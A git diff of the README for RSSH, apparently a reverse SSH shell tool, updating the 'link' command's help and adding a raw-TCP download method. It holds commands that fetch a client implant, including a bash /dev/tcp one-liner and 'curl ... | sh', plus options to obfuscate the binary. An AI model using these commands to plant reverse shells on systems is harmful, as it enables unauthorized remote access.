@@ -174,7 +174,7 @@ $ bin/client
 $ bin/client -d example.com:3232
 ```
 
-### Reverse shell download (client generation and in-built HTTP server)
+### Reverse shell download (client generation and in-built HTTP/Raw TCP server)
 
 The RSSH server can build and host client binaries (`link` command). Which is the preferred method for building and serving clients.
 For function to work the server must be placed in the project `bin/` folder, as it needs to find the client source.
@@ -189,25 +189,31 @@ catcher$ link -h
 link [OPTIONS]
 Link will compile a client and serve the resulting binary on a link which is returned.
 This requires the web server component has been enabled.
-	-s	Set homeserver address, defaults to server --external_address if set, or server listen address if not.
-	-l	List currently active download links
-	-r	Remove download link
-	-C	Comment to add as the public key (acts as the name)
-	--goos	Set the target build operating system (default runtime GOOS)
-	--goarch	Set the target build architecture (default runtime GOARCH)
-	--goarm	Set the go arm variable (not set by default)
-	--name	Set the link download url/filename (default random characters)
-	--proxy	Set connect proxy address to bake it
-	--tls	Use TLS as the underlying transport
-	--ws	Use plain http websockets as the underlying transport
-	--wss	Use TLS websockets as the underlying transport
-  --http	Use HTTP polling as the underlying transport
-  --https	Use HTTPS polling as the underlying transport
-	--shared-object	Generate shared object file
 	--fingerprint	Set RSSH server fingerprint will default to server public key
 	--garble	Use garble to obfuscate the binary (requires garble to be installed)
-	--upx	Use upx to compress the final binary (requires upx to be installed)
+	--goarch	Set the target build architecture (default runtime GOARCH)
+	--goarm	Set the go arm variable (not set by default)
+	--goos	Set the target build operating system (default runtime GOOS)
+	--http	Use http polling as the underlying transport
+	--https	Use https polling as the underlying transport
+	--name	Set the link download url/filename (default random characters)
 	--no-lib-c	Compile client without glibc
+	--owners	Set owners of client, if unset client is public all users. E.g --owners jsmith,ldavidson
+	--proxy	Set connect proxy address to bake it
+	--raw-download	Download over raw TCP, outputs bash downloader rather than http
+	--shared-object	Generate shared object file
+	--sni	When TLS is in use, set a custom SNI for the client to connect with
+	--stdio	Use stdin and stdout as transport, will disable logging, destination after stdio:// is ignored
+	--tls	Use TLS as the underlying transport
+	--upx	Use upx to compress the final binary (requires upx to be installed)
+	--working-directory	Set download/working directory for automatic script (i.e doing curl https://<url>.sh)
+	--ws	Use plain http websockets as the underlying transport
+	--wss	Use TLS websockets as the underlying transport
+	-C	Comment to add as the public key (acts as the name)
+	-l	List currently active download links
+	-o	Set owners of client, if unset client is public all users. E.g --owners jsmith,ldavidson
+	-r	Remove download link
+	-s	Set homeserver address, defaults to server --external_address if set, or server listen address if not
 
 # Generate a client and serve it on a named link
 catcher$ link --name test
@@ -223,7 +229,13 @@ chmod +x test
 ./test
 ```
 
-The RSSH server also supports `.sh`, and `.py` URL path endings which will generate a script you can pipe into an intepreter:
+Or you can use raw tcp to download the client binary:
+```sh
+bash -c "exec 3<>/dev/tcp/your.rssh.server.internal/3232; echo RAWtest>&3; cat <&3" > test
+```
+The format for this is just `RAW` followed by the filename, i.e in this case `test`, rssh can autogenerate this for you with `--raw-download`.
+
+The RSSH server also supports `.sh`, `.py` and `.ps1` URL path endings which will generate a script you can pipe into an intepreter:
 ```sh
 curl http://your.rssh.server.internal:3232/test.sh | sh
 ```
@@ -238,7 +250,7 @@ E.g
 ```
 
 Or by baking it in with the `link` command. 
-```
+```sh
 ssh your.rssh.server -p 3232 link --ws --name test
 ```
 
@@ -320,7 +332,7 @@ The SSH protocol supports calling subsystems with the `-s` flag. In RSSH this is
 
 e.g
 
-```
+```sh
 # Install the rssh binary as a service (windows only)
 ssh -J your.rssh.server.internal:3232 test-pc.user.test-pc -s service --install
 ```
@@ -389,11 +401,10 @@ When specifying what executable the rssh binary should run, either when connecti
 
 For example.
 
-```
+```sh
 connect --shell https://your.host/program <rssh_client_id>
 ssh -J your.rssh.server:3232 <rssh_client_id> https://your.host/program
 ```
-
 
 #### Supported URI Schemes
 
